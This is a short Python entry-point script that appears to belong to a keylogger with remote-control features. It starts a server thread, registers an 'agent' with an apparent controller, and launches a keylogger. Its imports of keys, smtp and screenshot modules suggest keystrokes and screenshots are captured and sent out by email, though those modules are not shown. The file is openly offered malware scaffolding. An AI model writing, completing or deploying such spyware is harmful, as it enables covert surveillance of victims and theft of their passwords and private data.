from keys import *
import config 
import storage 
import sys, os
import threading
import smtp
from screenshot import *
import time
import agent

def main():
   
   # threads running concurrently
    if __name__ == '__main__': 
        # 1. Start server in a thread
        server_thread = threading.Thread(target=agent.run_server)
        server_thread.daemon = True  # Thread dies when main thread dies
        server_thread.start()

        # 2. register the agent 
        agent.register()

        try:
        # 3. start keylogger
            run_keylogger()
        except KeyboardInterrupt:
            print("Program Exiting")

        
if __name__=="__main__":
    main()


    
    